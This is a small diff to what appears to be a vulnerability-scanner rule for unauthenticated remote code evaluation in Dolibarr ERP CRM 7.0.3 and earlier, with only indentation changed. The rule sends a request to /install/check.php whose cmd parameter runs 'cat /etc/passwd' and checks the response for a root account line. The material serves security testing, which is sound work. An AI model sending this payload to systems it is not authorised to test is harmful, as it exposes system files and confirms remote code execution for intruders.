@@ -9,10 +9,10 @@ rules:
      response.status == 200
   - method: GET
     path: /install/check.php?cmd=cat%20/etc/passwd
-    expression: 
-     response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    expression:
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
 detail:
   vulnType: Unauthenticated Remote Code Evaluation in Dolibarr ERP CRM =<7.0.3
   author: supersalted(https://github.com/salted)
   links:
-   - https://www.exploit-db.com/exploits/44964
+    - https://www.exploit-db.com/exploits/44964
